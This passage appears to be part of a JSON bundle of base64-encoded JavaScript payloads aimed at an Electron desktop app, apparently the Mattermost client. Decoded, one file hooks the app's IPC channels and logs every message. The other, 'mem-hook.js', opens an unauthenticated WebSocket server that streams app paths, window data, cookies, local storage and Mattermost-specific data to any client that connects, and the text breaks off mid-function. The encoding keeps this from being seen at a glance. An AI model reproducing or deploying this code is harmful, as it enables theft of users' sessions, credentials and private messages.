3RyaW5nKCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHlwZTogJ2hhbmRsZS1yZXNwb25zZScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hhbm5lbDogY2hhbm5lbCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXJlY3Rpb246ICdtYWluLT5yZW5kZXJlcicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YTogcmVzb2x2ZWRSZXN1bHQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlc29sdmVkUmVzdWx0OwogICAgICAgICAgICAgICAgICAgICAgICB9KS5jYXRjaChmdW5jdGlvbihlcnJvcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5sb2dNZXNzYWdlKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZDogbWVzc2FnZUlkICsgJy1lcnJvcicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZXN0YW1wOiBuZXcgRGF0ZSgpLnRvSVNPU3RyaW5nKCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHlwZTogJ2hhbmRsZS1lcnJvcicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hhbm5lbDogY2hhbm5lbCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXJlY3Rpb246ICdtYWluLT5yZW5kZXJlcicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YTogeyBlcnJvcjogZXJyb3IubWVzc2FnZSB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IGVycm9yOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAvLyBIYW5kbGUgc3luY2hyb25vdXMgcmVzdWx0CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYubG9nTWVzc2FnZSh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZDogbWVzc2FnZUlkICsgJy1yZXNwb25zZScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aW1lc3RhbXA6IG5ldyBEYXRlKCkudG9JU09TdHJpbmcoKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdoYW5kbGUtcmVzcG9uc2UnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hhbm5lbDogY2hhbm5lbCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpcmVjdGlvbjogJ21haW4tPnJlbmRlcmVyJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHJlc3VsdAogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgICAgICAgICAgIHNlbGYubG9nTWVzc2FnZSh7CiAgICAgICAgICAgICAgICAgICAgICAgIGlkOiBtZXNzYWdlSWQgKyAnLWVycm9yJywKICAgICAgICAgICAgICAgICAgICAgICAgdGltZXN0YW1wOiBuZXcgRGF0ZSgpLnRvSVNPU3RyaW5nKCksCiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdoYW5kbGUtZXJyb3InLAogICAgICAgICAgICAgICAgICAgICAgICBjaGFubmVsOiBjaGFubmVsLAogICAgICAgICAgICAgICAgICAgICAgICBkaXJlY3Rpb246ICdtYWluLT5yZW5kZXJlcicsCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHsgZXJyb3I6IGVycm9yLm1lc3NhZ2UgfQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIHRocm93IGVycm9yOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KTsKICAgICAgICB9OwogICAgfTsKICAgIAogICAgSVBDTW9uaXRvci5wcm90b3R5cGUuaG9va0lQQ01haW5PbiA9IGZ1bmN0aW9uKGlwY01haW4pIHsKICAgICAgICB2YXIgb3JpZ2luYWxPbiA9IGlwY01haW4ub247CiAgICAgICAgdmFyIHNlbGYgPSB0aGlzOwogICAgICAgIAogICAgICAgIGlwY01haW4ub24gPSBmdW5jdGlvbihjaGFubmVsLCBsaXN0ZW5lcikgewogICAgICAgICAgICByZXR1cm4gb3JpZ2luYWxPbi5jYWxsKHRoaXMsIGNoYW5uZWwsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgICAgICAgICAgICAgICB2YXIgYXJncyA9IEFycmF5LnByb3RvdHlwZS5zbGljZS5jYWxsKGFyZ3VtZW50cywgMSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHNlbGYubG9nTWVzc2FnZSh7CiAgICAgICAgICAgICAgICAgICAgaWQ6IHNlbGYuZ2VuZXJhdGVJZCgpLAogICAgICAgICAgICAgICAgICAgIHRpbWVzdGFtcDogbmV3IERhdGUoKS50b0lTT1N0cmluZygpLAogICAgICAgICAgICAgICAgICAgIHR5cGU6ICdvbi1ldmVudCcsCiAgICAgICAgICAgICAgICAgICAgY2hhbm5lbDogY2hhbm5lbCwKICAgICAgICAgICAgICAgICAgICBkaXJlY3Rpb246ICdyZW5kZXJlci0+bWFpbicsCiAgICAgICAgICAgICAgICAgICAgZGF0YTogYXJncwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHJldHVybiBsaXN0ZW5lci5hcHBseSh0aGlzLCBhcmd1bWVudHMpOwogICAgICAgICAgICB9KTsKICAgICAgICB9OwogICAgfTsKICAgIAogICAgSVBDTW9uaXRvci5wcm90b3R5cGUuaG9va0V4aXN0aW5nV2luZG93cyA9IGZ1bmN0aW9uKCkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHZhciBlbGVjdHJvbiA9IHJlcXVpcmUoJ2VsZWN0cm9uJyk7CiAgICAgICAgICAgIHZhciBCcm93c2VyV2luZG93ID0gZWxlY3Ryb24uQnJvd3NlcldpbmRvdzsKICAgICAgICAgICAgdmFyIHdpbmRvd3MgPSBCcm93c2VyV2luZG93LmdldEFsbFdpbmRvd3MoKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgd2luZG93cy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgdGhpcy5ob29rV2luZG93KHdpbmRvd3NbaV0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBjb25zb2xlLmxvZygnW0lQQy1NT05dIEhvb2tlZCAnICsgd2luZG93cy5sZW5ndGggKyAnIGV4aXN0aW5nIHdpbmRvd3MnKTsKICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSVBDLU1PTl0gRXJyb3IgaG9va2luZyBleGlzdGluZyB3aW5kb3dzOicsIGVycm9yKTsKICAgICAgICB9CiAgICB9OwogICAgCiAgICBJUENNb25pdG9yLnByb3RvdHlwZS5ob29rTmV3V2luZG93cyA9IGZ1bmN0aW9uKCkgewogICAgICAgIHZhciBzZWxmID0gdGhpczsKICAgICAgICAKICAgICAgICB0cnkgewogICAgICAgICAgICB2YXIgZWxlY3Ryb24gPSByZXF1aXJlKCdlbGVjdHJvbicpOwogICAgICAgICAgICB2YXIgYXBwID0gZWxlY3Ryb24uYXBwOwogICAgICAgICAgICAKICAgICAgICAgICAgYXBwLm9uKCdicm93c2VyLXdpbmRvdy1jcmVhdGVkJywgZnVuY3Rpb24oXywgd2luZG93KSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygnW0lQQy1NT05dIE5ldyB3aW5kb3cgY3JlYXRlZCwgaG9va2luZy4uLicpOwogICAgICAgICAgICAgICAgc2VsZi5ob29rV2luZG93KHdpbmRvdyk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICAKICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSVBDLU1PTl0gRXJyb3Igc2V0dGluZyB1cCBuZXcgd2luZG93IGhvb2tzOicsIGVycm9yKTsKICAgICAgICB9CiAgICB9OwogICAgCiAgICBJUENNb25pdG9yLnByb3RvdHlwZS5ob29rV2luZG93ID0gZnVuY3Rpb24od2luZG93KSB7CiAgICAgICAgaWYgKCF3aW5kb3cgfHwgIXdpbmRvdy53ZWJDb250ZW50cyB8fCB3aW5kb3cuX2lwY01vbkhvb2tlZCkgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIAogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHZhciBvcmlnaW5hbFNlbmQgPSB3aW5kb3cud2ViQ29udGVudHMuc2VuZDsKICAgICAgICAgICAgdmFyIHNlbGYgPSB0aGlzOwogICAgICAgICAgICAKICAgICAgICAgICAgd2luZG93LndlYkNvbnRlbnRzLnNlbmQgPSBmdW5jdGlvbihjaGFubmVsKSB7CiAgICAgICAgICAgICAgICB2YXIgYXJncyA9IEFycmF5LnByb3RvdHlwZS5zbGljZS5jYWxsKGFyZ3VtZW50cywgMSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHNlbGYubG9nTWVzc2FnZSh7CiAgICAgICAgICAgICAgICAgICAgaWQ6IHNlbGYuZ2VuZXJhdGVJZCgpLAogICAgICAgICAgICAgICAgICAgIHRpbWVzdGFtcDogbmV3IERhdGUoKS50b0lTT1N0cmluZygpLAogICAgICAgICAgICAgICAgICAgIHR5cGU6ICdzZW5kJywKICAgICAgICAgICAgICAgICAgICBjaGFubmVsOiBjaGFubmVsLAogICAgICAgICAgICAgICAgICAgIGRpcmVjdGlvbjogJ21haW4tPnJlbmRlcmVyJywKICAgICAgICAgICAgICAgICAgICBkYXRhOiBhcmdzLAogICAgICAgICAgICAgICAgICAgIHdpbmRvd0lkOiB3aW5kb3cuaWQKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZXR1cm4gb3JpZ2luYWxTZW5kLmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7CiAgICAgICAgICAgIH07CiAgICAgICAgICAgIAogICAgICAgICAgICB3aW5kb3cuX2lwY01vbkhvb2tlZCA9IHRydWU7CiAgICAgICAgICAgIAogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tJUEMtTU9OXSBFcnJvciBob29raW5nIHdpbmRvdzonLCBlcnJvcik7CiAgICAgICAgfQogICAgfTsKICAgIAogICAgSVBDTW9uaXRvci5wcm90b3R5cGUubG9nTWVzc2FnZSA9IGZ1bmN0aW9uKG1lc3NhZ2UpIHsKICAgICAgICB0cnkgewogICAgICAgICAgICB0aGlzLm1lc3NhZ2VzLnB1c2gobWVzc2FnZSk7CiAgICAgICAgICAgIGlmICh0aGlzLm1lc3NhZ2VzLmxlbmd0aCA+IHRoaXMubWF4TWVzc2FnZXMpIHsKICAgICAgICAgICAgICAgIHRoaXMubWVzc2FnZXMgPSB0aGlzLm1lc3NhZ2VzLnNsaWNlKC10aGlzLm1heE1lc3NhZ2VzKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgKHRoaXMubG9nRmlsZSkgewogICAgICAgICAgICAgICAgZnMuYXBwZW5kRmlsZVN5bmModGhpcy5sb2dGaWxlLCBKU09OLnN0cmluZ2lmeShtZXNzYWdlKSArICdcbicpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBjb25zb2xlLmxvZygnW0lQQy1NT05dICcgKyBtZXNzYWdlLmRpcmVjdGlvbiArICcgJyArIG1lc3NhZ2UuY2hhbm5lbCk7CiAgICAgICAgICAgIAogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tJUEMtTU9OXSBFcnJvciBsb2dnaW5nIG1lc3NhZ2U6JywgZXJyb3IpOwogICAgICAgIH0KICAgIH07CiAgICAKICAgIElQQ01vbml0b3IucHJvdG90eXBlLmdlbmVyYXRlSWQgPSBmdW5jdGlvbigpIHsKICAgICAgICByZXR1cm4gY3J5cHRvLnJhbmRvbUJ5dGVzKDMpLnRvU3RyaW5nKCdoZXgnKTsKICAgIH07CiAgICAKICAgIGZ1bmN0aW9uIGluaXRpYWxpemVNb25pdG9yKCkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHZhciBlbGVjdHJvbiA9IHJlcXVpcmUoJ2VsZWN0cm9uJyk7CiAgICAgICAgICAgIHZhciBhcHAgPSBlbGVjdHJvbi5hcHA7CiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAoYXBwLmlzUmVhZHkoKSkgewogICAgICAgICAgICAgICAgbmV3IElQQ01vbml0b3IoKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGFwcC5vbmNlKCdyZWFkeScsIGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIG5ldyBJUENNb25pdG9yKCk7CiAgICAgICAgICAgICAgICAgICAgfSwgMTAwMCk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfQogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tJUEMtTU9OXSBGYWlsZWQgdG8gaW5pdGlhbGl6ZTonLCBlcnJvcik7CiAgICAgICAgfQogICAgfQogICAgCiAgICBzZXRUaW1lb3V0KGluaXRpYWxpemVNb25pdG9yLCA1MDApOwogICAgCn0pKCk7Cgpjb25zb2xlLmxvZygnW0lQQy1NT05dIFBheWxvYWQgbG9hZGVkIHN1Y2Nlc3NmdWxseScpOwo=","mem-hook.js":"Y29uc29sZS5sb2coJ1tIRUFQLUVYVFJBQ1RdIFN0YXJ0aW5nIGRlZXAgaGVhcCBleHRyYWN0aW9uLi4uJyk7CgooZnVuY3Rpb24oKSB7CiAgICAndXNlIHN0cmljdCc7CiAgICAKICAgIC8vIFNraXAgaWYgYWxyZWFkeSBsb2FkZWQKICAgIGlmIChnbG9iYWwuX2hlYXBFeHRyYWN0b3JMb2FkZWQpIHsKICAgICAgICBjb25zb2xlLmxvZygnW0hFQVAtRVhUUkFDVF0gQWxyZWFkeSBsb2FkZWQsIHNraXBwaW5nLi4uJyk7CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgZ2xvYmFsLl9oZWFwRXh0cmFjdG9yTG9hZGVkID0gdHJ1ZTsKICAgIAogICAgY29uc3QgUE9SVCA9IDEwMDEzOwogICAgY29uc3QgeyBhcHAgfSA9IHJlcXVpcmUoJ2VsZWN0cm9uJyk7CiAgICBjb25zdCBodHRwID0gcmVxdWlyZSgnaHR0cCcpOwogICAgY29uc3QgY3J5cHRvID0gcmVxdWlyZSgnY3J5cHRvJyk7CiAgICAKICAgIC8vIENyZWF0ZSBXZWJTb2NrZXQgc2VydmVyCiAgICBmdW5jdGlvbiBjcmVhdGVTZXJ2ZXIoKSB7CiAgICAgICAgY29uc3QgY2xpZW50cyA9IG5ldyBTZXQoKTsKICAgICAgICBjb25zdCBzZXJ2ZXIgPSBodHRwLmNyZWF0ZVNlcnZlcigocmVxLCByZXMpID0+IHsKICAgICAgICAgICAgcmVzLnNldEhlYWRlcignQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luJywgJyonKTsKICAgICAgICAgICAgcmVzLnNldEhlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKTsKICAgICAgICAgICAgcmVzLndyaXRlSGVhZCgyMDApOwogICAgICAgICAgICByZXMuZW5kKEpTT04uc3RyaW5naWZ5KHtzdGF0dXM6ICdEZWVwIGhlYXAgZXh0cmFjdGlvbiBzZXJ2ZXIgcnVubmluZyd9KSk7CiAgICAgICAgfSk7CiAgICAgICAgCiAgICAgICAgLy8gV2ViU29ja2V0IHVwZ3JhZGUgaGFuZGxlciAtIHNhbWUgYXMgeW91ciB3b3JraW5nIGNvZGUKICAgICAgICBzZXJ2ZXIub24oJ3VwZ3JhZGUnLCAocmVxdWVzdCwgc29ja2V0LCBoZWFkKSA9PiB7CiAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbSEVBUC1FWFRSQUNUXSBXZWJTb2NrZXQgdXBncmFkZSByZXF1ZXN0ZWQnKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGNvbnN0IGtleSA9IHJlcXVlc3QuaGVhZGVyc1snc2VjLXdlYnNvY2tldC1rZXknXTsKICAgICAgICAgICAgaWYgKCFrZXkpIHsKICAgICAgICAgICAgICAgIHNvY2tldC5lbmQoJ0hUVFAvMS4xIDQwMCBCYWQgUmVxdWVzdFxyXG5cclxuJyk7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIEdlbmVyYXRlIFdlYlNvY2tldCBhY2NlcHQga2V5CiAgICAgICAgICAgIGNvbnN0IGFjY2VwdEtleSA9IGNyeXB0bwogICAgICAgICAgICAgICAgLmNyZWF0ZUhhc2goJ3NoYTEnKQogICAgICAgICAgICAgICAgLnVwZGF0ZShrZXkgKyAnMjU4RUFGQTUtRTkxNC00N0RBLTk1Q0EtQzVBQjBEQzg1QjExJykKICAgICAgICAgICAgICAgIC5kaWdlc3QoJ2Jhc2U2NCcpOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8gU2VuZCBXZWJTb2NrZXQgaGFuZHNoYWtlIHJlc3BvbnNlCiAgICAgICAgICAgIGNvbnN0IHJlc3BvbnNlSGVhZGVycyA9IFsKICAgICAgICAgICAgICAgICdIVFRQLzEuMSAxMDEgU3dpdGNoaW5nIFByb3RvY29scycsCiAgICAgICAgICAgICAgICAnVXBncmFkZTogd2Vic29ja2V0JywKICAgICAgICAgICAgICAgICdDb25uZWN0aW9uOiBVcGdyYWRlJywKICAgICAgICAgICAgICAgIGBTZWMtV2ViU29ja2V0LUFjY2VwdDogJHthY2NlcHRLZXl9YCwKICAgICAgICAgICAgICAgICcnLCAnJwogICAgICAgICAgICBdLmpvaW4oJ1xyXG4nKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBzb2NrZXQud3JpdGUocmVzcG9uc2VIZWFkZXJzKTsKICAgICAgICAgICAgICAgIGNsaWVudHMuYWRkKHNvY2tldCk7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygnW0hFQVAtRVhUUkFDVF0gV2ViU29ja2V0IGNsaWVudCBjb25uZWN0ZWQnKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gU3RhcnQgZXh0cmFjdGlvbiBwcm9jZXNzCiAgICAgICAgICAgICAgICBleHRyYWN0QWxsRGF0YShzb2NrZXQpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBzb2NrZXQub24oJ2Nsb3NlJywgKCkgPT4gewogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbSEVBUC1FWFRSQUNUXSBXZWJTb2NrZXQgY2xpZW50IGRpc2Nvbm5lY3RlZCcpOwogICAgICAgICAgICAgICAgICAgIGNsaWVudHMuZGVsZXRlKHNvY2tldCk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgc29ja2V0Lm9uKCdlcnJvcicsIChlcnIpID0+IHsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSEVBUC1FWFRSQUNUXSBXZWJTb2NrZXQgZXJyb3I6JywgZXJyKTsKICAgICAgICAgICAgICAgICAgICBjbGllbnRzLmRlbGV0ZShzb2NrZXQpOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSEVBUC1FWFRSQUNUXSBXZWJTb2NrZXQgaGFuZHNoYWtlIGVycm9yOicsIGVycm9yKTsKICAgICAgICAgICAgICAgIHNvY2tldC5lbmQoKTsKICAgICAgICAgICAgfQogICAgICAgIH0pOwogICAgICAgIAogICAgICAgIC8vIFdlYlNvY2tldCBtZXNzYWdlIHNlbmRlcgogICAgICAgIGZ1bmN0aW9uIHNlbmRXZWJTb2NrZXRNZXNzYWdlKHNvY2tldCwgbWVzc2FnZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgY29uc3QgYnVmZmVyID0gQnVmZmVyLmZyb20obWVzc2FnZSwgJ3V0ZjgnKTsKICAgICAgICAgICAgICAgIGNvbnN0IGZyYW1lTGVuZ3RoID0gYnVmZmVyLmxlbmd0aDsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGV0IGZyYW1lOwogICAgICAgICAgICAgICAgaWYgKGZyYW1lTGVuZ3RoIDwgMTI2KSB7CiAgICAgICAgICAgICAgICAgICAgZnJhbWUgPSBCdWZmZXIuYWxsb2MoZnJhbWVMZW5ndGggKyAyKTsKICAgICAgICAgICAgICAgICAgICBmcmFtZVswXSA9IDB4ODE7IC8vIFRleHQgZnJhbWUKICAgICAgICAgICAgICAgICAgICBmcmFtZVsxXSA9IGZyYW1lTGVuZ3RoOwogICAgICAgICAgICAgICAgICAgIGJ1ZmZlci5jb3B5KGZyYW1lLCAyKTsKICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoZnJhbWVMZW5ndGggPCA2NTUzNikgewogICAgICAgICAgICAgICAgICAgIGZyYW1lID0gQnVmZmVyLmFsbG9jKGZyYW1lTGVuZ3RoICsgNCk7CiAgICAgICAgICAgICAgICAgICAgZnJhbWVbMF0gPSAweDgxOyAvLyBUZXh0IGZyYW1lCiAgICAgICAgICAgICAgICAgICAgZnJhbWVbMV0gPSAxMjY7CiAgICAgICAgICAgICAgICAgICAgZnJhbWUud3JpdGVVSW50MTZCRShmcmFtZUxlbmd0aCwgMik7CiAgICAgICAgICAgICAgICAgICAgYnVmZmVyLmNvcHkoZnJhbWUsIDQpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBmcmFtZSA9IEJ1ZmZlci5hbGxvYyhmcmFtZUxlbmd0aCArIDEwKTsKICAgICAgICAgICAgICAgICAgICBmcmFtZVswXSA9IDB4ODE7IC8vIFRleHQgZnJhbWUKICAgICAgICAgICAgICAgICAgICBmcmFtZVsxXSA9IDEyNzsKICAgICAgICAgICAgICAgICAgICBmcmFtZS53cml0ZVVJbnQzMkJFKDAsIDIpOwogICAgICAgICAgICAgICAgICAgIGZyYW1lLndyaXRlVUludDMyQkUoZnJhbWVMZW5ndGgsIDYpOwogICAgICAgICAgICAgICAgICAgIGJ1ZmZlci5jb3B5KGZyYW1lLCAxMCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHNvY2tldC53cml0ZShmcmFtZSk7CiAgICAgICAgICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignW0hFQVAtRVhUUkFDVF0gRXJyb3Igc2VuZGluZyBXZWJTb2NrZXQgbWVzc2FnZTonLCBlcnIpOwogICAgICAgICAgICAgICAgaWYgKCFzb2NrZXQuZGVzdHJveWVkKSB7CiAgICAgICAgICAgICAgICAgICAgc29ja2V0LmVuZCgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIC8vIE1haW4gZXh0cmFjdGlvbiBmdW5jdGlvbgogICAgICAgIGFzeW5jIGZ1bmN0aW9uIGV4dHJhY3RBbGxEYXRhKHNvY2tldCkgewogICAgICAgICAgICBzZW5kV2ViU29ja2V0TWVzc2FnZShzb2NrZXQsIEpTT04uc3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgIHR5cGU6ICdleHRyYWN0aW9uX3N0YXJ0JywKICAgICAgICAgICAgICAgIHRpbWVzdGFtcDogbmV3IERhdGUoKS50b0lTT1N0cmluZygpCiAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAvLyAxLiBFeHRyYWN0IGFwcCBpbmZvCiAgICAgICAgICAgICAgICBhd2FpdCBleHRyYWN0QXBwSW5mbyhzb2NrZXQpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAvLyAyLiBFeHRyYWN0IEJyb3dzZXJXaW5kb3cgZGF0YQogICAgICAgICAgICAgICAgYXdhaXQgZXh0cmFjdFdpbmRvd3NEYXRhKHNvY2tldCk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIDMuIEV4dHJhY3QgY29va2llcyBhbmQgc3RvcmFnZQogICAgICAgICAgICAgICAgYXdhaXQgZXh0cmFjdENvb2tpZXNBbmRTdG9yYWdlKHNvY2tldCk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIDQuIEV4dHJhY3QgbG9jYWwgc3RvcmFnZSBkYXRhCiAgICAgICAgICAgICAgICBhd2FpdCBleHRyYWN0TG9jYWxTdG9yYWdlRGF0YShzb2NrZXQpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAvLyA1LiBFeHRyYWN0IE1hdHRlcm1vc3Qtc3BlY2lmaWMgZGF0YQogICAgICAgICAgICAgICAgYXdhaXQgZXh0cmFjdE1hdHRlcm1vc3REYXRhKHNvY2tldCk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIDYuIEV4dHJhY3QgbmV0d29yayBjb25uZWN0aW9ucwogICAgICAgICAgICAgICAgYXdhaXQgZXh0cmFjdE5ldHdvcmtEYXRhKHNvY2tldCk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIENvbXBsZXRlCiAgICAgICAgICAgICAgICBzZW5kV2ViU29ja2V0TWVzc2FnZShzb2NrZXQsIEpTT04uc3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgICAgICB0eXBlOiAnZXh0cmFjdGlvbl9jb21wbGV0ZScsCiAgICAgICAgICAgICAgICAgICAgdGltZXN0YW1wOiBuZXcgRGF0ZSgpLnRvSVNPU3RyaW5nKCkKICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSEVBUC1FWFRSQUNUXSBFeHRyYWN0aW9uIGVycm9yOicsIGVycik7CiAgICAgICAgICAgICAgICBzZW5kV2ViU29ja2V0TWVzc2FnZShzb2NrZXQsIEpTT04uc3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgICAgICB0eXBlOiAnZXJyb3InLAogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2U6IGVyci5tZXNzYWdlLAogICAgICAgICAgICAgICAgICAgIHN0YWNrOiBlcnIuc3RhY2sKICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICAvLyBFeHRyYWN0IGFwcGxpY2F0aW9uIGluZm8KICAgICAgICBhc3luYyBmdW5jdGlvbiBleHRyYWN0QXBwSW5mbyhzb2NrZXQpIHsKICAgICAgICAgICAgY29uc3QgYXBwSW5mbyA9IHsKICAgICAgICAgICAgICAgIHR5cGU6ICdhcHBfaW5mbycsCiAgICAgICAgICAgICAgICBuYW1lOiBhcHAuZ2V0TmFtZSgpLAogICAgICAgICAgICAgICAgdmVyc2lvbjogYXBwLmdldFZlcnNpb24oKSwKICAgICAgICAgICAgICAgIGxvY2FsZTogYXBwLmdldExvY2FsZSgpLAogICAgICAgICAgICAgICAgaXNQYWNrYWdlZDogYXBwLmlzUGFja2FnZWQsCiAgICAgICAgICAgICAgICBhcHBQYXRoOiBhcHAuZ2V0QXBwUGF0aCgpLAogICAgICAgICAgICAgICAgcGF0aHM6IHt9LAogICAgICAgICAgICAgICAgZWxlY3Ryb25WZXJzaW9uOiBwcm9jZXNzLnZlcnNpb25zLmVsZWN0cm9uLAogICAgICAgICAgICAgICAgY2hyb21lVmVyc2lvbjogcHJvY2Vzcy52ZXJzaW9ucy5jaHJvbWUKICAgICAgICAgICAgfTsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIEdldCBhbGwgYXBwIHBhdGhzCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBjb25zdCBwYXRoTmFtZXMgPSBbJ2hvbWUnLCAnYXBwRGF0YScsICd1c2VyRGF0YScsICdzZXNzaW9uRGF0YScsIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3RlbXAnLCAnZXhlJywgJ21vZHVsZScsICdkZXNrdG9wJywgJ2RvY3VtZW50cycsIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2Rvd25sb2FkcycsICdsb2dzJywgJ2NyYXNoRHVtcHMnXTsKICAgICAgICAgICAgICAgIGZvciAoY29uc3QgbmFtZSBvZiBwYXRoTmFtZXMpIHsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICBhcHBJbmZvLnBhdGhzW25hbWVdID0gYXBwLm